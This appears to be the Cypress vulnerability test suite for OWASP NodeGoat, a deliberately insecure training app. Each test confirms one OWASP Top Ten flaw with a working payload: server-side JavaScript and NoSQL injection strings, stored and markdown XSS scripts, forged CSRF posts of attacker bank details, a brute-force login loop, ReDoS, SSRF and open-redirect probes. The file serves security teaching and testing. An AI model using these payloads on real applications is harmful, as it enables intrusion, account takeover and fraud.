/// <reference types="Cypress" />
const isInteractive = Cypress.config("isInteractive");
const isCI = Cypress.env("TEST_TAGS").includes("CI");

if (isCI || isInteractive) describe("Vulnerabilities", () => {
  "use strict";

  before(() => {
    cy.dbReset();
  });

  it("Should demonstrate A1: Injection (SSJS)", () => {
    const ssjsProof = "permits-ssjs";

    cy.userSignIn();
    cy.visitPage("/contributions");

    cy.get("table input")
      .then(($fields) => {
        const cookieNames = $fields.map((i, field) => {
          const cookieName = `input-${field.name}`;
          // This payload makes the server add an extra cookie to the response
          // It evaluates to 0, 1 or 10, which are all valid allocation values
          const payload = `1; res.cookie("${cookieName}", "${ssjsProof}"); 0`;
          cy.enterFormText(field, payload);

          return cookieName;
        });

        // This can fail if the csrf middleware was enabled without adding the
        // corresponding hidden _csrf token field to the contributions form
        cy.get("[type='submit']")
          .click();
        cy.get(".alert-success").should("be.visible");

        cy.wrap(cookieNames)
          .each((cookieName) => {
            cy.getCookie(cookieName)
              .should("exist")
              .its("value")
              .should("eq", ssjsProof);
        });
    });
  });

  it("Should demonstrate A1: Injection (NoSQL)", () => {
    cy.userSignIn();

    // Use sidebar link instead of visiting. This should work even if "/:userId"
    // is removed from the allocations route
    cy.get("#allocations-menu-link")
      .click();

    cy.get(".panel-info .panel-heading")
      .should("not.contain", "Asset Allocations for Node Goat Admin");

    // This payload makes the database return allocations for userId 1 (admin)
    // It evaluates to 0 or 1 (valid thresholds) if any fixes are implemented
    const payload = "0'; this.userId == '1";
    cy.enterFormText("input[name='threshold']", payload);
    cy.get("[type='submit']")
      .click();

    cy.get(".panel-info .panel-heading")
      .noRetry()
      .should("contain", "Asset Allocations for Node Goat Admin");
  });

  it("Should demonstrate A1: Injection (Log)", () => {
    cy.visitPage("/login");

    cy.get("form input[name='_csrf']")
      .then(($csrfInput) => {
        const csrfToken = $csrfInput.val();

        const requestBody = {
          userName: "INVENTED\n<INJECTED LOG ENTRY>",
          password: "TO BE REJECTED",
          _csrf: csrfToken
        };
        cy.formPostRequest("/login", requestBody)
          .then(function() {
            cy.log("Attempted to inject '<INJECTED LOG ENTRY>', check the nodegoat log");

            // No way to verify this automatically, so record the test as skipped
            this.skip();
        });
    });
  });

  it.skip("Should demonstrate A2: Broken Auth (Plaintext credential storage)", () => {
    // Requires DB access to verify
  });

  it("Should demonstrate A2: Broken Auth (Session Hijack)", () => {
    cy.userSignIn();
    cy.visitPage("/logout");

    cy.getCookies()
      .should("have.length", 1)
      .its("0")
      .then((oldCookie) => {
        // Check that session cookie is unprotected
        expect(oldCookie).to.have.property("httpOnly", false);
        expect(oldCookie).to.have.property("secure", false);

        cy.userSignIn();

        // Check that the cookie wasn't regenerated since last login
        cy.getCookie(oldCookie.name)
          .should("exist")
          .should("have.property", "value", oldCookie.value);
    });
  });

  it("Should demonstrate A2: Broken Auth (Brute force)", () => {
    cy.fixture("users/vuln_user.json").as("newUser");
    cy.get("@newUser").then((newUser) => {
      // Make a new user with a weak password
      cy.visitPage("/signup");
      cy.enterFormText("#userName", newUser.user);
      cy.enterFormText("#firstName", newUser.firstName);
      cy.enterFormText("#lastName", newUser.lastName);
      cy.enterFormText("#password,#verify", newUser.pass);
      cy.get("[type='submit']")
        .click();

      // The signup handler doesn't redirect on success but does log in. Visiting
      // the dashboard without getting redirected to login confirms signup success
      cy.visitPage("/dashboard");
      cy.location("pathname")
        .noRetry()
        .should("not.eq", "/login");

      // Check that the error messages for invalid password and invalid username differ
      cy.signIn(newUser.user, "TO BE REJECTED");

      cy.get(".alert-danger")
        .then(($passwordAlert) => {
          cy.signIn("INVENTED", newUser.pass);

          cy.get(".alert-danger")
            .noRetry()
            .should("not.have.html", $passwordAlert.html());
      });

      // Check that there is no protection against brute force attack
      cy.visitPage("/login");

      cy.get("form input[name='_csrf']")
        .then(($csrfInput) => {
          const csrfToken = $csrfInput.val();

          const maxAttempts = 20;
          const maxDuration = Cypress.config("defaultCommandTimeout");
          const nextRequest = (attemptIndex = 0) => {
            expect(attemptIndex, "attempts").to.be.lessThan(maxAttempts);

            const requestBody = {
              userName: newUser.user,
              password: attemptIndex.toString(),
              _csrf: csrfToken
            };
            return cy.formPostRequest("/login", requestBody, { followRedirect: false })
              .then((request) => {
                expect(request.duration, "duration").to.be.lessThan(maxDuration);
                if (request.status === 302) {
                  expect(request.headers.location, "location").to.eq("/dashboard");
                } else {
                  return nextRequest(attemptIndex + 1);
                }
            });
          };

          nextRequest();
      });
    });
  });

  it("Should demonstrate A3: XSS (Stored)", () => {
    const xssProof = "A3: Stored XSS";
    cy.on("window:alert", cy.stub().as("alert handler"));

    cy.userSignIn();
    cy.visitPage("/profile");

    cy.get("form input[name='_csrf']")
      .then(($csrfInput) => {
        const csrfToken = $csrfInput.val();

        // Ideally this would be typed into the profile form, but electron detects the
        // XSS reflected in the header bar and blocks the response. That makes Cypress
        // fail the test even though the payload was stored successfully.
        const requestBody = {
          firstName: `Mallory<script>alert("${xssProof}")</script>`,
          bankRouting: "1234567#",
          _csrf: csrfToken
        };
        cy.formPostRequest("/profile", requestBody);
    });

    cy.adminSignIn();

    cy.get("@alert handler")
      .noRetry()
      .should("have.been.calledWith", xssProof);
  });

  it("Should demonstrate A4: Insecure DOR", () => {
    cy.userSignIn();

    // Use sidebar link instead of visiting. This should work even if "/:userId"
    // is removed from the allocations route
    cy.get("#allocations-menu-link")
      .click();

    cy.get(".panel-info .panel-heading")
      .should("not.contain", "Asset Allocations for Node Goat Admin");

    cy.visitPage("/allocations/1");

    cy.get(".panel-info .panel-heading")
      .noRetry()
      .should("contain", "Asset Allocations for Node Goat Admin");
  });

  it("Should demonstrate A5: Misconfig", () => {
    cy.userSignIn();

    // Check that the session cookie name leaks information about the server
    cy.getCookie("connect.sid")
      .should("exist");

    cy.request("/dashboard")
      .its("headers")
      .then((headers) => {
        // Check that headers leak information about the server
        expect(headers).to.have.property("x-powered-by", "Express");

        // Check that security-related headers are missing
        expect(headers).to.not.have.property("x-frame-options");
        expect(headers).to.not.have.property("cache-control");
        expect(headers).to.not.have.property("content-security-policy");
        expect(headers).to.not.have.property("strict-transport-security");
        expect(headers).to.not.have.property("x-content-type-options");
    });
  });

  it("Should demonstrate A6: Sensitive Data Exposure (HTTP transport)", () => {
    cy.visitPage("/");

    cy.location("protocol")
      .noRetry()
      .should("eq", "http:");
  });

  it.skip("Should demonstrate A6: Sensitive Data Exposure (Plaintext storage)", () => {
    // Requires DB access to verify
  });

  it("Should demonstrate A7: Access Controls", () => {
    const newBenefitStart = "2021-09-25";

    cy.userSignIn();
    cy.visitPage("/benefits");

    // Check that an unauthorized user can view the benefits page
    cy.location("pathname")
      .noRetry()
      .should("eq", "/benefits");

    // Check that an unauthorized user can modify benefit start dates
    cy.get("tbody > tr:nth-of-type(1)")
      .within(() => {
        cy.enterFormText("input[name='benefitStartDate']", newBenefitStart);
        cy.get("[type='submit']")
          .click();
    });

    cy.visitPage("/logout");
    cy.adminSignIn();

    cy.get("tbody > tr:nth-of-type(1)")
      .within(() => {
        cy.get("input[name='benefitStartDate']")
          .noRetry()
          .should("have.value", newBenefitStart);
    });
  });

  it("Should demonstrate A8: CSRF", () => {
    const attackerAccount = "5555555555";
    const attackerRouting = "7777777#";

    cy.userSignIn();

    // Simulate an attacker's site posting to NodeGoat /profile
    const requestBody = {
      bankAcc: attackerAccount,
      bankRouting: attackerRouting
    };
    cy.formPostRequest("/profile", requestBody, { failOnStatusCode: false });

    cy.visitPage("/profile");

    cy.get("#bankRouting")
      .noRetry()
      .should("have.value", attackerRouting);

    cy.get("#bankAcc")
      .noRetry()
      .should("have.value", attackerAccount);
  });

  it("Should demonstrate A9: Insecure Components", () => {
    const xssProof = "A9: Marked XSS";
    cy.on("window:alert", cy.stub().as("alert handler"));

    cy.userSignIn();
    cy.visitPage("/memos");

    const payload = `[link](javascript&#58this;alert("${xssProof}"&#41;)`;
    cy.enterFormText("textarea[name='memo']", payload);
    cy.get("[type='submit']")
      .click();

    cy.get(".panel-body > p")
      .noRetry()
      .should("have.descendants", "a")
      .find("a")
      .click();

    cy.get("@alert handler")
      .noRetry()
      .should("have.been.calledWith", xssProof);
  });

  it("Should demonstrate A10: Redirects", () => {
    const targetUrl = "https://owasp.org/";

    cy.userSignIn();

    // Check that the sidebar link uses the redirect
    cy.get("#learn-menu-link")
      .should("have.attr", "href")
      .noRetry()
      .should("contain", "/learn?url=");

    // Check that the redirect is performed by the server and can be exploited
    const requestOptions = {
      url: `/learn?url=${targetUrl}`,
      followRedirect: false,
      failOnStatusCode: false
    };
    cy.request(requestOptions)
      .then((response) => {
        expect(response.status, "status").to.eq(302);
        expect(response.redirectedToUrl, "location").to.eq(targetUrl);
    });
  });

  it("Should demonstrate E1: ReDoS Attacks", () => {
    cy.userSignIn();
    cy.visitPage("/profile");

    cy.get("form input[name='_csrf']")
      .then(($csrfInput) => {
        const csrfToken = $csrfInput.val();

        const maxRoutingLength = 50;
        const nextRequest = (bankRouting, minDuration = Infinity) => {
          expect(bankRouting.length, "length").to.be.lessThan(maxRoutingLength);

          const requestBody = {
            bankRouting: bankRouting,
            _csrf: csrfToken
          };
          return cy.formPostRequest("/profile", requestBody)
            .then((request) => {
              const duration = request.duration;
              cy.log(`duration: ${duration}`);

              minDuration = Math.min(duration, minDuration);
              if (duration < (minDuration + 400)) {
                return nextRequest(`${bankRouting}9`, minDuration);
              }
          });
        };

        nextRequest("9".repeat(15));
    });
  });

  it("Should demonstrate E2: SSRF", () => {
    cy.userSignIn();
    cy.visitPage("/research");

    cy.title()
      .should("not.eq", "Tutorial - OWASP Node Goat Project");

    // Note: The serverside request this invokes will fail if NodeGoat is using HTTPS
    cy.visitPage(`/research?url=${Cypress.config("baseUrl")}/tutorial/ssrf&symbol=%23`);

    // Check the serverside request wasn't replaced with a redirect
    cy.location("pathname")
      .noRetry()
      .should("eq", "/research");

    cy.get("body > :nth-child(1)")
      .noRetry()
      .should("contain", "stock information");

    // Check the serverside request's content was returned to the browser
    cy.title()
      .noRetry()
      .should("eq", "Tutorial - OWASP Node Goat Project");
  });
});
